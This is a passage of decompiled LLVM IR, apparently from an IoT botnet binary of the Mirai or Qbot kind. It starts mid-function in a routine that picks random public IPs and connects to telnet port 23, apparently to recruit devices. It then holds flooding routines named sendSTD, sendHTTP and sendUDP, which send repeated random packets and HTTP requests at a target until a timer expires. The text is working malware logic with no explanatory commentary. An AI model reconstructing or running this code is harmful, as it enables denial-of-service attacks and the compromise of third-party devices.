  %v1_10003c98 = inttoptr i32 %v1_10003c94 to i32*
  %v2_10003c98 = load i32, i32* %v1_10003c98, align 4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003cb4 = inttoptr i32 %v2_10003bd4 to i32*
  store i32 0, i32* %v2_10003cb4, align 4
  %v1_10003cbc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cbc = add i32 %v1_10003cbc, 4
  %v3_10003cbc = inttoptr i32 %v2_10003cbc to i32*
  store i32 0, i32* %v3_10003cbc, align 4
  %v1_10003cc4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc4 = add i32 %v1_10003cc4, 8
  %v3_10003cc4 = inttoptr i32 %v2_10003cc4 to i32*
  store i32 0, i32* %v3_10003cc4, align 4
  %v1_10003ccc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ccc = add i32 %v1_10003ccc, 12
  %v3_10003ccc = inttoptr i32 %v2_10003ccc to i32*
  store i32 0, i32* %v3_10003ccc, align 4
  %v1_10003cd4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cd4 = add i32 %v1_10003cd4, 16
  %v3_10003cd4 = inttoptr i32 %v2_10003cd4 to i32*
  store i32 0, i32* %v3_10003cd4, align 4
  %v1_10003cdc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cdc = add i32 %v1_10003cdc, 20
  %v3_10003cdc = inttoptr i32 %v2_10003cdc to i32*
  store i32 0, i32* %v3_10003cdc, align 4
  %v1_10003ce4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003ce4 = add i32 %v1_10003ce4, 24
  %v3_10003ce4 = inttoptr i32 %v2_10003ce4 to i32*
  store i32 0, i32* %v3_10003ce4, align 4
  store i32 %v1_10003c94, i32* %r9.global-to-local, align 4
  store i32 %v2_10003c98, i32* %v1_10003c98, align 4
  store i32 268451084, i32* @lr, align 4
  %v1_10003d08 = call i32 @GetRandomPublicIP(i32 %v1_10003c94)
  %v0_10003d14 = load i32, i32* @r29, align 4
  %v1_10003d14 = mul i32 %v0_10003d14, 28
  %v1_10003d1c = add i32 %v1_10003d14, %v2_10003d18
  store i32 %v1_10003d1c, i32* %r9.global-to-local, align 4
  %v2_10003d20 = inttoptr i32 %v1_10003d1c to i32*
  store i32 %v1_10003d08, i32* %v2_10003d20, align 4
  br label %dec_label_pc_10003de4

dec_label_pc_10003d28:                            ; preds = %dec_label_pc_10003c38
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v3_10003d38 = load i8, i8* %v2_10003c74, align 1
  %v3_10003d40 = icmp eq i8 %v3_10003d38, 0
  br i1 %v3_10003d40, label %dec_label_pc_10003d48, label %dec_label_pc_10003de4

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003d28
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003d58 = add i32 %v2_10003bd4, 11
  %v2_10003d58 = inttoptr i32 %v1_10003d58 to i8*
  %v3_10003d58 = load i8, i8* %v2_10003d58, align 1
  %v1_10003d60 = add i8 %v3_10003d58, 1
  store i8 %v1_10003d60, i8* %v2_10003d58, align 1
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003d88 = add i32 %v2_10003bd4, 10
  %v2_10003d88 = inttoptr i32 %v1_10003d88 to i8*
  %v3_10003d88 = load i8, i8* %v2_10003d88, align 2
  %v1_10003d90 = add i8 %v3_10003d88, 1
  store i8 %v1_10003d90, i8* %v2_10003d88, align 2
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v3_10003db8 = load i8, i8* %v2_10003d88, align 2
  %v3_10003dc0 = icmp eq i8 %v3_10003db8, 9
  br i1 %v3_10003dc0, label %dec_label_pc_10003dc8, label %dec_label_pc_10003de4

dec_label_pc_10003dc8:                            ; preds = %dec_label_pc_10003d48
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10003c74, align 1
  br label %dec_label_pc_100049b0

dec_label_pc_10003de4:                            ; preds = %dec_label_pc_10003d48, %dec_label_pc_10003d28, %dec_label_pc_10003c84
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10003df0 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_10003e24 = add i32 %v2_10003bd4, 4
  store i32 %v1_10003e24, i32* %r9.global-to-local, align 4
  store i32 268451396, i32* @lr, align 4
  %v3_10003e40 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10003e4c = mul i32 %storemerge48, 28
  %v2_10003e50 = add i32 %v1_10003e4c, %v1_10003ab4
  %v2_10003e54 = inttoptr i32 %v2_10003e50 to i32*
  store i32 %v3_10003e40, i32* %v2_10003e54, align 4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v1_10003e68 = inttoptr i32 %v2_10003bd4 to i32*
  %v2_10003e68 = load i32, i32* %v1_10003e68, align 4
  store i32 %v2_10003e68, i32* %r9.global-to-local, align 4
  %v4_10003e70 = icmp eq i32 %v2_10003e68, -1
  br i1 %v4_10003e70, label %dec_label_pc_100049b0, label %dec_label_pc_10003e78

dec_label_pc_10003e78:                            ; preds = %dec_label_pc_10003de4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003e88 = load i32, i32* %v1_10003e68, align 4
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003e9c = load i32, i32* %v1_10003e68, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @__libc_fcntl(i32 %v2_10003e9c, i32 3)
  store i32 268451536, i32* @lr, align 4
  %v2_10003ecc = call i32 @__libc_fcntl(i32 %v2_10003e88, i32 4)
  store i32 %v2_10003bd4, i32* %r9.global-to-local, align 4
  %v2_10003ee0 = load i32, i32* %v1_10003e68, align 4
  store i32 %v2_10003ee4, i32* %r9.global-to-local, align 4
  store i32 268451576, i32* @lr, align 4
  %v3_10003ef4 = call i32 @__libc_connect(i32 %v2_10003ee0, i32 %v2_10003ee4, i32 16)
  store i32 %v3_10003ef4, i32* %r9.global-to-local, align 4
  %v4_10003f00 = icmp eq i32 %v3_10003ef4, -1
  br i1 %v4_10003f00, label %dec_label_pc_10003f08, label %dec_label_pc_10003f38

dec_label_pc_10003f08:                            ; preds = %dec_label_pc_10003e78
  %v0_10003f08 = call i32 @__errno_location()
  store i32 %v0_10003f08, i32* %r9.global-to-local, align 4
  %v1_10003f10 = inttoptr i32 %v0_10003f08 to i32*
  %v2_10003f10 = load i32, i32* %v1_10003f10, align 4
  %v3_10003f14 = icmp eq i32 %v2_10003f10, 115
  br i1 %v3_10003f14, label %dec_label_pc_10003f38, label %dec_label_pc_10003f1c

dec_label_pc_10003f1c:                            ; preds = %dec_label_pc_10003f08
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10003f34.70 to i32), i32* @lr, align 4
  %v2_10003f30 = call i32 @reset_telstate(i32 %v2_10003bd4, i32 %v1_10003ab4)
  br label %dec_label_pc_100049b0

dec_label_pc_10003f38:                            ; preds = %dec_label_pc_10003e78, %dec_label_pc_10003f08
  store i32 %v1_10003ab4, i32* %r9.global-to-local, align 4
  %v3_10003f50 = call i32 @advance_state(i32* nonnull %v1_10003e68, i32 1)
  br label %dec_label_pc_100049b0

dec_label_pc_100049b0:                            ; preds = %dec_label_pc_10003de4, %dec_label_pc_10003c10, %dec_label_pc_10003f38, %dec_label_pc_10003f1c, %dec_label_pc_10003dc8
  %v1_100049b4 = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_100049c4 = icmp slt i32 %v1_100049b4, %arg2
  br i1 %v2_100049c4, label %dec_label_pc_10003bc8, label %dec_label_pc_10003bbc

; uselistorder directives
  uselistorder i32 %v1_100049b4, { 1, 0 }
  uselistorder i8* %v2_10003d88, { 1, 0, 2 }
  uselistorder i32 %v1_10003c94, { 1, 0, 2, 3 }
  uselistorder i8 %v3_10003c20, { 1, 0 }
  uselistorder i32 %v2_10003bd4, { 6, 7, 8, 9, 11, 10, 12, 0, 1, 3, 2, 5, 4, 16, 14, 13, 15, 18, 17, 20, 19, 21 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10003b70, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_10003ab4, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 32, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 45, 27, 28, 29, 30, 31, 46, 33, 41, 34, 35, 36, 37, 38, 39, 40, 47, 42, 43, 44 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_100049b0, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_10003f38, { 1, 0 }
  uselistorder label %dec_label_pc_10003c10, { 1, 0 }
  uselistorder label %dec_label_pc_10003bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10003bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268454400, i32* @lr, align 4
  %v3_100049fc = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268454416, i32* @lr, align 4
  %v1_10004a0c = call i32 @__GI_time(i32 0)
  store i32 268454436, i32* @lr, align 4
  %v1_10004a20 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10004a2c = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_10004a54 = add i32 %v1_10004a20, 16
  %v2_10004a54 = inttoptr i32 %v1_10004a54 to i32*
  %v3_10004a54 = load i32, i32* %v2_10004a54, align 4
  %v1_10004a58 = inttoptr i32 %v3_10004a54 to i32*
  %v2_10004a58 = load i32, i32* %v1_10004a58, align 4
  %v2_10004a60 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10004a68 = add i32 %v1_10004a20, 12
  %v2_10004a68 = inttoptr i32 %v1_10004a68 to i32*
  %v3_10004a68 = load i32, i32* %v2_10004a68, align 4
  store i32 %v3_10004a68, i32* @r5, align 4
  store i32 268454524, i32* @lr, align 4
  %v4_10004a78 = call i32 @bcopy(i32 %v2_10004a58, i32 %v2_10004a60, i32 %v3_10004a68, i32 %v1_10004a20)
  %v1_10004a80 = add i32 %v1_10004a20, 8
  %v2_10004a80 = inttoptr i32 %v1_10004a80 to i32*
  %v3_10004a80 = load i32, i32* %v2_10004a80, align 4
  %v1_10004a84 = urem i32 %v3_10004a80, 65536
  store i32 %v1_10004a84, i32* %stack_var_-196, align 4
  %v2_10004aa8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10004af8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10004afc = add i32 %v2_10004af8, 36
  %v2_10004b54 = add i32 %v1_10004a0c, %arg3
  br label %dec_label_pc_10004aa0

dec_label_pc_10004aa0:                            ; preds = %dec_label_pc_10004b78, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_10004b7c, %dec_label_pc_10004b78 ]
  store i32 %v2_10004aa8, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_10011eec.413 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10004ac0.414 to i32), i32* @lr, align 4
  %v0_10004abc = call i32 @memcpy()
  store i32 268454596, i32* @lr, align 4
  %v0_10004ac0 = call i32 @random()
  %v1_10004ad8 = urem i32 %v0_10004ac0, 36
  %v1_10004af4 = mul nuw nsw i32 %v1_10004ad8, 4
  %v1_10004b00 = add i32 %v2_10004afc, %v1_10004af4
  %v1_10004b04 = inttoptr i32 %v1_10004b00 to i32*
  %v2_10004b04 = load i32, i32* %v1_10004b04, align 4
  store i32 %v2_10004b04, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_10004b78, label %dec_label_pc_10004b18

dec_label_pc_10004b18:                            ; preds = %dec_label_pc_10004aa0
  store i32 268454700, i32* @lr, align 4
  %v4_10004b28 = call i32 @__libc_send(i32 %v3_100049fc, i32 %v2_10004b04, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10004b40.415 to i32), i32* @lr, align 4
  %v3_10004b3c = call i32 @__libc_connect(i32 %v3_100049fc, i32 %v2_10004a2c, i32 16)
  store i32 268454728, i32* @lr, align 4
  %v1_10004b44 = call i32 @__GI_time(i32 0)
  %v2_10004b58 = icmp slt i32 %v1_10004b44, %v2_10004b54
  br i1 %v2_10004b58, label %dec_label_pc_10004b70, label %dec_label_pc_10004b60

dec_label_pc_10004b60:                            ; preds = %dec_label_pc_10004b18
  store i32 ptrtoint ([3 x i8]* @global_var_10004b68.416 to i32), i32* @lr, align 4
  %v1_10004b64 = call i32 @__libc_close(i32 %v3_100049fc)
  %v1_10004b6c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10004b70

dec_label_pc_10004b70:                            ; preds = %dec_label_pc_10004b18, %dec_label_pc_10004b60
  br label %dec_label_pc_10004b78

dec_label_pc_10004b78:                            ; preds = %dec_label_pc_10004aa0, %dec_label_pc_10004b70
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10004aa0 ], [ 0, %dec_label_pc_10004b70 ]
  %v1_10004b7c = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10004aa0

; uselistorder directives
  uselistorder i32 %v3_10004a68, { 1, 0 }
  uselistorder i32 %v1_10004a20, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_10004b78, { 1, 0 }
  uselistorder label %dec_label_pc_10004b70, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-568 = alloca i32, align 4
  store i32 268454848, i32* @lr, align 4
  %v1_10004bbc = call i32 @__GI_time(i32 0)
  %v2_10004bc8 = add i32 %v1_10004bbc, %arg5
  %v2_10004d088 = icmp sgt i32 %arg6, 0
  br i1 %v2_10004d088, label %dec_label_pc_10004be4.lr.ph, label %dec_label_pc_10004d10

dec_label_pc_10004be4.lr.ph:                      ; preds = %entry
  %v2_10004c30 = ptrtoint i32* %stack_var_-568 to i32
  br label %dec_label_pc_10004be4

dec_label_pc_10004be4:                            ; preds = %dec_label_pc_10004be4.lr.ph, %dec_label_pc_10004cf4
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10004be4.lr.ph ], [ %v1_10004cf8, %dec_label_pc_10004cf4 ]
  store i32 268454888, i32* @lr, align 4
  %v0_10004be4 = call i32 @random()
  %v2_10004c00 = srem i32 %v0_10004be4, 36
  %v1_10004c24 = mul nsw i32 %v2_10004c00, 4
  %v2_10004c28 = add i32 %v1_10004c24, ptrtoint ([36 x i8*]* @global_var_10024024.454 to i32)
  %v1_10004c2c = inttoptr i32 %v2_10004c28 to i32*
  %v2_10004c2c = load i32, i32* %v1_10004c2c, align 4
  store i32 %v2_10004c30, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c58.456 to i32), i32* @lr, align 4
  %v10_10004c54 = call i32 @sprintf(i32 %v2_10004c30, i32 ptrtoint ([64 x i8]* @global_var_10011f7c.455 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_10004c2c, i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 %v2_10004c00)
  store i32 268455004, i32* @lr, align 4
  %v0_10004c58 = call i32 @__libc_fork()
  %v3_10004c60 = icmp eq i32 %v0_10004c58, 0
  br i1 %v3_10004c60, label %dec_label_pc_10004cf4, label %dec_label_pc_10004cd4.preheader

dec_label_pc_10004cd4.preheader:                  ; preds = %dec_label_pc_10004be4
  store i32 268455132, i32* @lr, align 4
  %v1_10004cd84 = call i32 @__GI_time(i32 0)
  %v2_10004ce45 = icmp slt i32 %v1_10004cd84, %v2_10004bc8
  br i1 %v2_10004ce45, label %dec_label_pc_10004c6c, label %dec_label_pc_10004cec

dec_label_pc_10004c6c:                            ; preds = %dec_label_pc_10004cd4.preheader, %dec_label_pc_10004cd4.backedge
  %v4_10004c7c = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v2_10004bc8)
  %v3_10004c8c = icmp eq i32 %v4_10004c7c, 0
  br i1 %v3_10004c8c, label %dec_label_pc_10004cd4.backedge, label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c6c
  store i32 %v2_10004c30, i32* @r3, align 4
  %v0_10004c9c = call i32 @__GI_strlen()
  store i32 268455096, i32* @lr, align 4
  %v2_10004cb4 = call i32 @__libc_write(i32 %v4_10004c7c, i32 %v2_10004c30)
  store i32 268455116, i32* @lr, align 4
  %v1_10004cc8 = call i32 @__libc_read(i32 %v4_10004c7c)
  store i32 ptrtoint ([3 x i8]* @global_var_10004cd4.457 to i32), i32* @lr, align 4
  %v1_10004cd0 = call i32 @__libc_close(i32 %v4_10004c7c)
  br label %dec_label_pc_10004cd4.backedge

dec_label_pc_10004cd4.backedge:                   ; preds = %dec_label_pc_10004c94, %dec_label_pc_10004c6c
  store i32 268455132, i32* @lr, align 4
  %v1_10004cd8 = call i32 @__GI_time(i32 0)
  %v2_10004ce4 = icmp slt i32 %v1_10004cd8, %v2_10004bc8
  br i1 %v2_10004ce4, label %dec_label_pc_10004c6c, label %dec_label_pc_10004cec

dec_label_pc_10004cec:                            ; preds = %dec_label_pc_10004cd4.backedge, %dec_label_pc_10004cd4.preheader
  %v0_10004cf0 = call i32 @__GI_exit()
  br label %dec_label_pc_10004cf4

dec_label_pc_10004cf4:                            ; preds = %dec_label_pc_10004be4, %dec_label_pc_10004cec
  %v0_10004d2413 = phi i32 [ 0, %dec_label_pc_10004be4 ], [ %v0_10004cf0, %dec_label_pc_10004cec ]
  %v1_10004cf8 = add nuw nsw i32 %storemerge311, 1
  %v2_10004d08 = icmp slt i32 %v1_10004cf8, %arg6
  br i1 %v2_10004d08, label %dec_label_pc_10004be4, label %dec_label_pc_10004d10

dec_label_pc_10004d10:                            ; preds = %dec_label_pc_10004cf4, %entry
  %v0_10004d24 = phi i32 [ %v1_10004bbc, %entry ], [ %v0_10004d2413, %dec_label_pc_10004cf4 ]
  ret i32 %v0_10004d24

; uselistorder directives
  uselistorder i32 %v2_10004c30, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10004bc8, { 1, 2, 0 }
  uselistorder i32 %v1_10004bbc, { 1, 0 }
  uselistorder i32 268455132, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10004cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10004c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10004be4, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004d28 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004d28, i32* %stack_var_-160, align 4
  %v0_10004d5c = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10004d6c = icmp eq i32 %arg2, 0
  br i1 %v3_10004d6c, label %dec_label_pc_10004d74, label %dec_label_pc_10004d88

dec_label_pc_10004d74:                            ; preds = %entry
  %v0_10004d74 = call i32 @rand_cmwc()
  br label %dec_label_pc_10004da0

dec_label_pc_10004d88:                            ; preds = %entry
  %v1_10004d8c = urem i32 %arg2, 65536
  store i32 %v1_10004d8c, i32* @r3, align 4
  %v1_10004d94 = call i32 @htons(i32 %v1_10004d8c)
  br label %dec_label_pc_10004da0

dec_label_pc_10004da0:                            ; preds = %dec_label_pc_10004d74, %dec_label_pc_10004d88
  %v2_10004da0 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10004db0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10004da0)
  %v3_10004db8 = icmp eq i32 %v4_10004db0, 0
  br i1 %v3_10004db8, label %dec_label_pc_10004dc0, label %dec_label_pc_1000538c

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004da0
  %v3_10004de4 = icmp eq i32 %arg4, 32
  br i1 %v3_10004de4, label %dec_label_pc_10004dec, label %dec_label_pc_10004f68

dec_label_pc_10004dec:                            ; preds = %dec_label_pc_10004dc0
  store i32 268455420, i32* @lr, align 4
  %v3_10004df8 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10004e08 = icmp eq i32 %v3_10004df8, 0
  br i1 %v3_10004e08, label %dec_label_pc_10004e10, label %dec_label_pc_10004e30

dec_label_pc_10004e10:                            ; preds = %dec_label_pc_10004dec
  %v3_10004e14 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10004e2c.459 to i32), i32* @lr, align 4
  %v5_10004e28 = call i32 @Rootsprintf(i32 %v3_10004e14, i32 ptrtoint ([27 x i8]* @global_var_10011fbc.458 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000538c

dec_label_pc_10004e30:                            ; preds = %dec_label_pc_10004dec
  %v1_10004e34 = add i32 %arg5, 1
  store i32 %v1_10004e34, i32* @r3, align 4
  store i32 268455488, i32* @lr, align 4
  %v0_10004e3c = call i32 @malloc()
  %v3_10004e4c = icmp eq i32 %v0_10004e3c, 0
  br i1 %v3_10004e4c, label %dec_label_pc_1000538c, label %dec_label_pc_10004e54

dec_label_pc_10004e54:                            ; preds = %dec_label_pc_10004e30
  store i32 268455540, i32* @lr, align 4
  %v3_10004e70 = call i32 @__GI_memset(i32 %v0_10004e3c, i32 0, i32 %v1_10004e34)
  %v2_10004e7c = call i32 @makeRandomStr(i32 %v0_10004e3c, i32 %arg5)
  store i32 268455560, i32* @lr, align 4
  %v1_10004e84 = call i32 @__GI_time(i32 0)
  %v2_10004e90 = add i32 %v1_10004e84, %arg3
  %v1_10004f40 = mul i32 %v0_10004d5c, 1000
  br label %dec_label_pc_10004eac.outer

dec_label_pc_10004eac.outer:                      ; preds = %dec_label_pc_10004eac.outer.backedge, %dec_label_pc_10004e54
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_10004e54 ], [ %storemerge27, %dec_label_pc_10004eac.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_10004e54 ], [ %v1_10004f24, %dec_label_pc_10004eac.outer.backedge ]
  br label %dec_label_pc_10004eac

dec_label_pc_10004eac:                            ; preds = %dec_label_pc_10004eac.outer, %dec_label_pc_10004f14
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10004f14 ], [ %stack_var_-44.0.ph, %dec_label_pc_10004eac.outer ]
  store i32 268455632, i32* @lr, align 4
  %v7_10004ecc = call i32 @__libc_sendto(i32 %v3_10004df8, i32 %v0_10004e3c, i32 %arg5, i32 0, i32 %v2_10004da0, i32 16, i32 %v2_10004da0)
  %v4_10004ed8 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10004ed8, label %dec_label_pc_10004ee0, label %dec_label_pc_10004f20

dec_label_pc_10004ee0:                            ; preds = %dec_label_pc_10004eac
  br i1 %v3_10004d6c, label %dec_label_pc_10004eec, label %dec_label_pc_10004efc

dec_label_pc_10004eec:                            ; preds = %dec_label_pc_10004ee0
  %v0_10004eec = call i32 @rand_cmwc()
  br label %dec_label_pc_10004efc

dec_label_pc_10004efc:                            ; preds = %dec_label_pc_10004ee0, %dec_label_pc_10004eec
  store i32 268455684, i32* @lr, align 4
  %v1_10004f00 = call i32 @__GI_time(i32 0)
  %v3_10004f0c = icmp sgt i32 %v1_10004f00, %v2_10004e90
  br i1 %v3_10004f0c, label %dec_label_pc_1000538c, label %dec_label_pc_10004f14

dec_label_pc_10004f14:                            ; preds = %dec_label_pc_10004efc
  br label %dec_label_pc_10004eac

dec_label_pc_10004f20:                            ; preds = %dec_label_pc_10004eac
  %v1_10004f24 = add i32 %stack_var_-44.0, 1
  %v4_10004f34 = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_10004f34, label %dec_label_pc_10004f3c, label %dec_label_pc_10004f58

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004f20
  store i32 ptrtoint ([3 x i8]* @global_var_10004f4c.461 to i32), i32* @lr, align 4
  %v2_10004f48 = call i32 @usleep(i32 %v1_10004f40, i32 %arg7)
  br label %dec_label_pc_10004eac.outer.backedge

dec_label_pc_10004eac.outer.backedge:             ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f58
  %storemerge27 = phi i32 [ %v1_10004f5c, %dec_label_pc_10004f58 ], [ 0, %dec_label_pc_10004f3c ]
  br label %dec_label_pc_10004eac.outer

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f20
  %v1_10004f5c = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_10004eac.outer.backedge

dec_label_pc_10004f68:                            ; preds = %dec_label_pc_10004dc0
  store i32 268455808, i32* @lr, align 4
  %v3_10004f7c = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10004f8c = icmp eq i32 %v3_10004f7c, 0
  br i1 %v3_10004f8c, label %dec_label_pc_10004f94, label %dec_label_pc_10004fb4

dec_label_pc_10004f94:                            ; preds = %dec_label_pc_10004f68
  %v3_10004f98 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10004fb0.462 to i32), i32* @lr, align 4
  %v5_10004fac = call i32 @Rootsprintf(i32 %v3_10004f98, i32 ptrtoint ([27 x i8]* @global_var_10011fbc.458 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000537c

dec_label_pc_10004fb4:                            ; preds = %dec_label_pc_10004f68
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10004fbc = ptrtoint i32* %stack_var_-96 to i32
  store i32 268455896, i32* @lr, align 4
  %v5_10004fd4 = call i32 @__GI_setsockopt(i32 %v3_10004f7c, i32 0, i32 3, i32 %v2_10004fbc, i32 4)
  %tmp77 = icmp sgt i32 %v5_10004fd4, -1
  br i1 %tmp77, label %dec_label_pc_10005004, label %dec_label_pc_10004fe4

dec_label_pc_10004fe4:                            ; preds = %dec_label_pc_10004fb4
  %v3_10004fe8 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10005000.464 to i32), i32* @lr, align 4
  %v5_10004ffc = call i32 @Rootsprintf(i32 %v3_10004fe8, i32 ptrtoint ([33 x i8]* @global_var_10011fd8.463 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000537c

dec_label_pc_10005004:                            ; preds = %dec_label_pc_10004fb4
  br label %dec_label_pc_10005010

dec_label_pc_10005010:                            ; preds = %dec_label_pc_10005004, %dec_label_pc_10005010
  %v1_1000504822 = phi i32 [ 49, %dec_label_pc_10005004 ], [ %v1_10005048, %dec_label_pc_10005010 ]
  store i32 268455960, i32* @lr, align 4
  %v1_10005014 = call i32 @__GI_time(i32 0)
  %v0_10005020 = call i32 @rand_cmwc()
  %v2_10005028 = xor i32 %v1_10005014, %v0_10005020
  store i32 ptrtoint (i32* @global_var_10005034.465 to i32), i32* @lr, align 4
  %v1_10005030 = call i32 @srand(i32 %v2_10005028)
  store i32 268455992, i32* @lr, align 4
  %v0_10005034 = call i32 @random()
  %v1_10005040 = call i32 @init_rand(i32 %v0_10005034)
  %v1_10005048 = add nsw i32 %v1_1000504822, -1
  %v4_10005058 = icmp eq i32 %v1_1000504822, 0
  br i1 %v4_10005058, label %dec_label_pc_10005060, label %dec_label_pc_10005010

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005010
  %v3_10005064 = icmp eq i32 %arg4, 0
  br i1 %v3_10005064, label %dec_label_pc_10005090, label %dec_label_pc_10005078

dec_label_pc_10005078:                            ; preds = %dec_label_pc_10005060
  %v1_1000507c = sub i32 32, %arg4
  %v2_10005084 = urem i32 %v1_1000507c, 64
  %v1_10005088 = shl i32 -1, %v2_10005084
  br label %dec_label_pc_10005090

dec_label_pc_10005090:                            ; preds = %dec_label_pc_10005060, %dec_label_pc_10005078
  %storemerge10 = phi i32 [ %v1_10005088, %dec_label_pc_10005078 ], [ 0, %dec_label_pc_10005060 ]
  %v1_10005094 = add i32 %arg5, 28
  %v1_100050a4 = add i32 %arg5, 58
  %v1_100050a8 = and i32 %v1_100050a4, -16
  %v2_100050b0 = load i32, i32* %stack_var_-160, align 4
  %v1_100050b8 = load i32, i32* @r1, align 4
  %v3_100050b8 = sub i32 %v1_100050b8, %v1_100050a8
  %v4_100050b8 = inttoptr i32 %v3_100050b8 to i32*
